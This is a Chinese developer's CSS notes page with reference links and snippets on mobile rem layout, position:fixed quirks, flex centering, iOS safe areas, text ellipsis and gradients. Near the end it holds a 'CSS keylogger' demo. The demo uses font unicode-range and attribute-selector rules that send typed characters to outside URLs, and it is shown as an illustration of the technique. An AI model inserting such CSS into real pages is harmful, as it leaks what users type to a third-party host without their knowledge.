## CSS w3c 规范

[Cascading Style Sheets Level 2 Revision 1 (CSS 2.1) Specification](https://www.w3.org/TR/2011/REC-CSS2-20110607/#minitoc)

## 参考链接

### Tailwind Box Shadows css 参考

- https://tailwindcss.com/docs/shadows

### CSS Weekly

- https://css-weekly.com/archives/

### 30-seconds-of-css ⭐️⭐️⭐️⭐️

https://github.com/30-seconds/30-seconds-of-css

### QiShaoXuan css_tricks css tricks⭐️⭐️⭐️⭐️

https://qishaoxuan.github.io/css_tricks/

### flex 练习 ⭐️⭐️

https://pq1949.github.io/learn-css/flex%E7%BB%83%E4%B9%A0.html

## CSS 基础

### HTML 常见元素

![css](/../imgs/css1.png)

### 移动端布局

[使用 hotcss 可以让移动端布局开发更容易](http://imochen.github.io/hotcss/)
https://github.com/imochen/hotcss

rem

```js
  <script>!function(a,b){function c(){var b=f.getBoundingClientRect().width;b/i>540&&(b=540*i);var c=b/10;f.style.fontSize=c+"px",k.rem=a.rem=c}var d,e=a.document,f=e.documentElement,g=e.querySelector('meta[name="viewport"]'),h=e.querySelector('meta[name="flexible"]'),i=0,j=0,k=b.flexible||(b.flexible={});if(g){console.warn("将根据已有的meta标签来设置缩放比例");var l=g.getAttribute("content").match(/initial\-scale=([\d\.]+)/);l&&(j=parseFloat(l[1]),i=parseInt(1/j))}else if(h){var m=h.getAttribute("content");if(m){var n=m.match(/initial\-dpr=([\d\.]+)/),o=m.match(/maximum\-dpr=([\d\.]+)/);n&&(i=parseFloat(n[1]),j=parseFloat((1/i).toFixed(2))),o&&(i=parseFloat(o[1]),j=parseFloat((1/i).toFixed(2)))}}if(!i&&!j){var p=(a.navigator.appVersion.match(/android/gi),a.navigator.appVersion.match(/iphone/gi)),q=a.devicePixelRatio;i=p?q>=3&&(!i||i>=3)?3:q>=2&&(!i||i>=2)?2:1:1,j=1/i}if(f.setAttribute("data-dpr",i),!g)if(g=e.createElement("meta"),g.setAttribute("name","viewport"),g.setAttribute("content","initial-scale="+j+", maximum-scale="+j+", minimum-scale="+j+", user-scalable=no, viewport-fit=cover"),f.firstElementChild)f.firstElementChild.appendChild(g);else{var r=e.createElement("div");r.appendChild(g),e.write(r.innerHTML)}a.addEventListener("resize",function(){clearTimeout(d),d=setTimeout(c,300)},!1),a.addEventListener("pageshow",function(a){a.persisted&&(clearTimeout(d),d=setTimeout(c,300))},!1),"complete"===e.readyState?e.body.style.fontSize=12*i+"px":e.addEventListener("DOMContentLoaded",function(){e.body.style.fontSize=12*i+"px"},!1),c(),k.dpr=a.dpr=i,k.refreshRem=c,k.rem2px=function(a){var b=parseFloat(a)*this.rem;return"string"==typeof a&&a.match(/rem$/)&&(b+="px"),b},k.px2rem=function(a){var b=parseFloat(a)/this.rem;return"string"==typeof a&&a.match(/px$/)&&(b+="rem"),b}}(window,window.lib||(window.lib={}));</script>
```

### 不受控制的 position:fixed

当元素祖先的 transform 属性非 none 时，容器由视口改为该祖先

1. transform 属性值不为 none 的元素
2. perspective 值不为 none 的元素
3. 在 will-change 中指定了任意 CSS 属性
4. filter 属性不为 none

经过测试发现，在 MAC 下的 Safari 浏览器（WebKit 内核，Version 9.1.2 (11601.7.7)）和 IE Trident/ 内核及 Edge 浏览器下，上述三种方式都不会改变 position: fixed 的表现！

https://developer.mozilla.org/zh-CN/docs/Web/CSS/position

https://www.cnblogs.com/coco1s/p/7358830.html

https://codepen.io/Chokcoco/pen/wqXZXd

### BFC

https://developer.mozilla.org/zh-CN/docs/Web/Guide/CSS/Block_formatting_context

### 探秘 flex 上下文中神奇的自动 margin

- 水平垂直居中最简单的方法

```html
<div class="g-container">
  <div class="g-box"></div>
</div>
```
```cs
.g-container {
    width: 100vw;
    height: 100vh;

    display: flex;
    // display: grid;
    // display: inline-flex;
    // display: inline-grid;
}

.g-box {
    width: 40vmin;
    height: 40vmin;
    background: #000;

    margin: auto;
}
```
https://codepen.io/Chokcoco/pen/GarPev


https://juejin.im/post/5ce60afde51d455ca04361b1?utm_source=gold_browser_extension


### IE 不支持 transition 中的属性是通过 calc 计算出来的
https://stackoverflow.com/questions/41804100/css-transition-not-working


### 自定义 滚动条
https://css-tricks.com/custom-scrollbars-in-webkit/


### 使用Flexible实现手淘H5页面的终端适配
https://www.w3cplus.com/mobile/lib-flexible-for-html5-layout.html
https://github.com/amfe/lib-flexible

### 全站置灰
```css

html {
  filter: progid:DXImageTransform.Microsoft.BasicImage(grayscale=1);
  -webkit-filter: grayscale(100%);
  -webkit-filter: grayscale(1);
  filter: grayscale(100%);
  filter: gray;
}
```

### CSS 字体资源加载优化  font-display:  wrap
https://css-tricks.com/almanac/properties/f/font-display/

### 禁用移动端长按图片弹出图片或者系统菜单

Safari中可以添加这样的样式
```css
*{
  -webkit-touch-callout: none;
}
```
但是微信中或者安卓手机长按还是能显示系统菜单

最好的解决办法是在不需要长按弹出图片的img标签上加上

```css
img {
  pointer-events: none;
}
```
但是这样会使得图片的点击事件也失效，使用的时候得注意

浏览器弹出图片或者系统菜单是在识别到img标签触发的，所以还有一种改法是把图片换成div标签，然后图片设置为div的背景图片

```css
div{
  background: url('xxx.png') 50% 50% / 100% auto no-repeat;
}
```
https://mp.weixin.qq.com/s/IEfWFvPUGzTLFHKT2EuPTw


### safari 中 fixed元素不显示的问题
 可能是fixed元素触发了某个规则没相对viewport定位，而是相对于其父元素的高度定位了，所以检查一下其父元素的高度或者改为 absolute 定位

 https://www.cnblogs.com/coco1s/p/7358830.html


### ios安全区域

```css
.header-gap-ios {
  /* IOS11.2- */
  height: constant(safe-area-inset-top);
  /* IOS11.2+ */
  height: env(safe-area-inset-top);
}
```
另外还需要设置 viewport-fit=cover

```html
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
```
https://segmentfault.com/a/1190000014475895

https://webkit.org/blog/7929/designing-websites-for-iphone-x/


###  单行和多行文本省略号

```css
{
    width: 200px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
}
```

```css
{
    width: 200px;
    overflow : hidden;
    text-overflow: ellipsis;
    display: -webkit-box;
    -webkit-line-clamp: 2;
    -webkit-box-orient: vertical;
}

```
https://juejin.cn/post/6932647134944886797?utm_source=gold_browser_extension


### CSS样式分析
https://cssstats.com/stats?url=https%3A%2F%2Flego.mgtv.com%2Fact%2F3_5_3%2F20210222mzssxs10.html%3Fact_name%3D20210222mzssxs10


### 优惠券样式
https://juejin.cn/post/6945023989555134494
https://juejin.cn/post/6975882876193603597
https://coupon.codelabo.cn/


### 2022年推荐6个有意思的css tools！
https://juejin.cn/post/7049923513318604813


### hover style

https://freebiesupply.com/blog/css-button-hover-effects/


### css 键盘记录器

```html
<!doctype html>
<!-- <meta http-equiv="content-security-policy" content="default-src 'self' 'unsafe-inline';;"> -->
<title>css keylogger</title>
<style>
@font-face { font-family: x; src: url(https://vipcdn.mgtv.com/upload/20180408/close.png?a);  unicode-range: U+61; }
@font-face { font-family: x; src: url(https://vipcdn.mgtv.com/upload/20180408/close.png?b);  unicode-range: U+62; }
@font-face { font-family: x; src: url(https://vipcdn.mgtv.com/upload/20180408/close.png?c);  unicode-range: U+63; }
@font-face { font-family: x; src: url(https://vipcdn.mgtv.com/upload/20180408/close.png?d);  unicode-range: U+64; }
input { font-family: 'x', 'Comic sans ms'; }
</style>
<input value="a">type `bcd` and watch network log


<style>
  input[value="a"] { background: url(https://example.com/?value=a); }
</style>

```
https://scotthelme.co.uk/can-you-get-pwned-with-css/


###  文字背景渐变

```css

background: -webkit-linear-gradient(300deg, #93f5ec 20%, #a77bf3 70%);
background-clip: text;
-webkit-text-fill-color: transparent;
-webkit-box-decoration-break: clone;



linear-gradient(90deg, rgb(236, 0, 140), rgb(0, 112, 243))

```
